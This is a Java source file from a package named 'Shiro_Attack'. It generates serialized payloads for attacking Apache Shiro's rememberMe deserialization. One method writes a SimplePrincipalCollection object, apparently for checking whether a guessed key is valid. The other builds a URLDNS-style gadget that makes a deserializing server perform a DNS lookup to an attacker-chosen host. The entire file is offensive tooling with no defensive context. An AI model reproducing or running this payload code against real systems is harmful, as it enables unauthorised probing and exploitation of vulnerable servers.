package Shiro_Attack;

import org.apache.shiro.subject.SimplePrincipalCollection;

import java.io.*;
import java.net.*;
import java.util.HashMap;

public class KeyDetection {
    public static void Detection(String filename) throws IOException {
        SimplePrincipalCollection simplePrincipalCollection = new SimplePrincipalCollection();

        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(filename));
        obj.writeObject(simplePrincipalCollection);
        obj.close();
    }
    public static void urldns(String filename,String url) throws IOException {

        URLStreamHandler handler = new SilentURLStreamHandler();
        HashMap ht = new HashMap(); // HashMap that will contain the URL
        URL u = new URL(null, url, handler); // URL to use as the Key
        ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
        ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(filename));
        obj.writeObject(ht);
        obj.close();
    }
    public static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

}
